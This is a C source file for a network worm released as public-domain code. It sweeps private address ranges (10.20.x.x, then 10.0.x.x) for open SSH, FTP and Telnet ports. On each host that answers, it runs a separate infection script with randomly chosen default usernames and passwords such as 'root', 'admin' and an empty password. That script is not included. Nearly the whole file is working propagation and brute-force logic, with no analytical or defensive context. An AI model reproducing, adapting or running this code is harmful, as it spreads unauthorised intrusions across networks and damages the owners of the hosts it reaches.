/*
 * .wormy.c
 * This is free and unencumbered software released into the public domain.
 *
 * Anyone is free to copy, modify, publish, use, compile, sell, or distribute this software, either in source code form or as a compiled binary, for any purpose, commercial or non-commercial, and by any means.
 *
 * In jurisdictions that recognize copyright laws, the author or authors of this software dedicate any and all copyright interest in the software to the public domain. We make this dedication for the benefit of the public at large and to the detriment of our heirs and successors. We intend this dedication to be an overt act of relinquishment in perpetuity of all present and future rights to this software under copyright law.
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 * For more information, please refer to http://unlicense.org
 * 
 * 
 */
// This is a lazy code.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

struct serverConnectionFunction{
	int port;
	char address[BUFSIZ];
};

void sub(){
	system("echo \"pop box\">~/boxy.log");
}

int server_Outgoing(void* argument){
	struct serverConnectionFunction *arguments = argument;
	int port = *(int*)&arguments->port;
	char *address = (char*)&arguments->address;
	
	struct sockaddr_in server;
	
	memset((char *) &server, 0, sizeof(server));
	
	server.sin_family = AF_INET;
	inet_pton(AF_INET, address, &server.sin_addr.s_addr);
	server.sin_port = htons(port);
	
	int new_socket;
	
	if ((new_socket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		return 0;
	
	if (connect(new_socket, (struct sockaddr *) &server, sizeof(server)) < 0)
		return 0;
	
	close(new_socket);
	return 1;
}

int main(int argc, char **argv)
{
	sub(); // Start payload.
	int ij[2] = {10, 20}; // Hosts Segment to infect.
	int c=0;
	int maxWait = 30;
	int maxTryPerSequence = 2;
	char *command = malloc(BUFSIZ);
	int pa[3] = {22, 21, 23};
	char *userlist[3] = {"root", "admin", "administrater"};
	char *passlist[4] = {"root", "password", "", "admin"};
	char *user = malloc(BUFSIZ);
	char *pass = malloc(BUFSIZ);
	char *infectionCode[1] = {"~/.wormys.sh"};
	int i, j, p, k;
	pop:
	for (i = 0; i < 254; i++)
	{
		for (j = 0; j < 254; j++)
		{
			for (p = 0; p < sizeof(pa)/sizeof(int); p++)
			{
				memset(command, 0, BUFSIZ*sizeof(char));
				struct serverConnectionFunction argumentsOutgoing;
				argumentsOutgoing.port = pa[p];
				sprintf(command, "%d.%d.%d.%d", ij[0], ij[1], i, j);
				strncpy(argumentsOutgoing.address, command, strlen(command));
				if (server_Outgoing((void *) &argumentsOutgoing)==1){
					for (k =0; k<maxTryPerSequence; k++){
						memset(user, 0, BUFSIZ*sizeof(char));
						memset(pass, 0, BUFSIZ*sizeof(char));
						sprintf(user, "%s", userlist[rand() % 3]);
						sprintf(pass, "%s", passlist[rand() % 4]);
						memset(command, 0, BUFSIZ*sizeof(char));
						if (pa[p]==22) // SSH
							sprintf(command, "%s ssh", infectionCode[0]);
						else if (pa[p]==21)// Ftp
							sprintf(command, "%s ftp", infectionCode[0]);
						else if (pa[p]==23)// Telnet
							sprintf(command, "%s telnet", infectionCode[0]);
						sprintf(command, "%s %s %s %d.%d.%d.%d&", command, user, pass, ij[0], ij[1], i, j);
						system(command);
						sleep(rand() % maxWait/2);
					}
				}
				sleep(rand() % maxWait/2);
			}
			sleep(rand() % maxWait);
		}
	}
	if (c==0){
		c++;
		ij[0] = 10;
		ij[1] = 0;
		goto pop;
	}
	free(user);
	free(pass);
	free(command);
	return 0;
}
